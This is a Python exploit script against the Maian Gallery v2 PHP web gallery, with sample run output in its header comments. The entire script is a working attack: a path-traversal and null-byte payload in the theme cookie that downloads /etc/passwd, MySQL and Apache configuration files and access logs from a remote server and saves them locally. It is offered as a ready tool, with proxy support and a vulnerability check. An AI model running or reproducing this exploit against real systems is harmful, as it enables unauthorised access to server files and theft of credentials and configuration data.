#!/usr/bin/python
#
# This vulnerability uses file_get_contents()
# so we have some limitations, we cant execute PHP
# and we cant read files that the web server will
# interpret such as PHP, conf etc
#
# tested on: Ubuntu Linux 2.6.32 with php v5.3.2
# register_globals = Off
#
# PRIVATE 0DAY - code by mr_me
# Vulnerability found by my special PHP friend and is now patched, hence this PoC ;)
#
# mr_me@1337:~$ sudo ~/maian.py -p 127.0.0.1:8080 -t localhost -d /maian_gallery/ -o /home/mr_me/
#
#		| ------------------------------------------------------------- |
#		|        -= Maian Gallery v2 Local File Download Exploit =      |
#		| ---------------------------[ by mr_me ]---------------------- |
#
# (+) Checking target @: http://localhost/maian_gallery/
#
# (+) Testing Proxy...
# (+) Proxy working! 127.0.0.1:8080
# (+) Building Handler..
# (+) File download is working!
# (+) Looking for remote configuration files and saving them to /home/mr_me/
# (+) Found file on remote host @ /var/log/apache2/access.log
# (+) Found file on remote host @ /etc/mysql/my.cnf
# (+) Found file on remote host @ /etc/passwd
# (!) Done!
#

import sys, os, httplib, socket, urllib2, re
from optparse import OptionParser

usage= "./%prog [<options>] -t [target] -d [directory] -o [output dir to save files]"
usage += "\nExample : ./%prog -p 203.167.876.54:80 -t localhost -d maian_gallery/"
parser = OptionParser(usage=usage)
parser.add_option("-p", type="string",action="store", dest="proxy",
                  help="HTTP Proxy <server:port>")
parser.add_option("-t", type="string", action="store", dest="target",
                  help="The target server")
parser.add_option("-d", type="string", action="store", dest="directory",
                  help="The dir path to maian gallery")
parser.add_option("-o", type="string", action="store", dest="outputDir",
                  help="Output dir to save all files")
(options, args) = parser.parse_args()

def banner():
    print "\n\t\t| ------------------------------------------------------------ |"
    print "\t\t|        -= Maian Gallery v2 Local File Download Exploit =-    |"
    print "\t\t| ---------------------------[ by mr_me ]--------------------- |\n"

if len(sys.argv) < 4:
	banner()
        parser.print_help()
        sys.exit(1)

def getProxy():
	try:
        	pr = httplib.HTTPConnection(options.proxy)
        	pr.connect()
        	proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
	except(socket.timeout):
                print "\n(-) Proxy Timed Out"
                sys.exit(1)
	except(),msg:
                print "\n(-) Proxy Failed"
                sys.exit(1)
	return proxy_handler

dltest = "etc/passwd"
dotDotSlash = '../../../../../../../../../'
findAllFiles = ['/var/log/apache2/access_log', '/var/log/apache2/access.log',
'/etc/mysql/my.cnf', '/etc/my.cnf', '/etc/passwd', '/etc/apache2/httpd.conf']

if options.target[0:6] != 'http://':
	options.target = "http://" + options.target

def getRequest(localFile):
	if options.proxy:
		try:
        		proxyfier = urllib2.build_opener(getProxy())
        		proxyfier.addheaders = [('Cookie', 'PHPSESSID=d0tcacup9euftbsb9kd7r55db3; mgallery_theme_cookie='+dotDotSlash+localFile+"%00")]
        		check = proxyfier.open(options.target+options.directory).read()
		except urllib2.HTTPError, error:
                        check = error.read()
	else:
		try:
        		req = urllib2.Request(options.target+options.directory)
        		req.add_header('Cookie', 'PHPSESSID=d0tcacup9euftbsb9kd7r55db3; mgallery_theme_cookie='+dotDotSlash+localFile+"%00")
        		check = urllib2.urlopen(req).read()
		except urllib2.HTTPError, error:
			check = error.read()
	return check

banner()

print "(+) Checking target @: %s" % (options.target+options.directory)
if options.proxy:
	print "\n(+) Testing Proxy..."
	print "(+) Proxy working! %s" % (options.proxy)
	print "(+) Building Handler.."
check = getRequest(dltest)
if re.findall("root:x:", check):
	print "(+) File download is working!"
	print "(+) Looking for remote configuration files and saving them to %s" % (options.outputDir)
	for f in findAllFiles:
		checkFile = getRequest(f)
		if len(checkFile) > 0:
			print "(+) Found file on remote host @ %s" % (f)
			filenames = f.split('/')
			try:
				ff = open(options.outputDir+filenames[len(filenames)-1]+'.txt','w')
				ff.write(checkFile)
				ff.close()
			except:
				print "(-) Cannot save remote files locally.. check your path"
	print "(!) Done!\n"
else:
    	print "(-) Target not vulnerable to the file download vulnerability"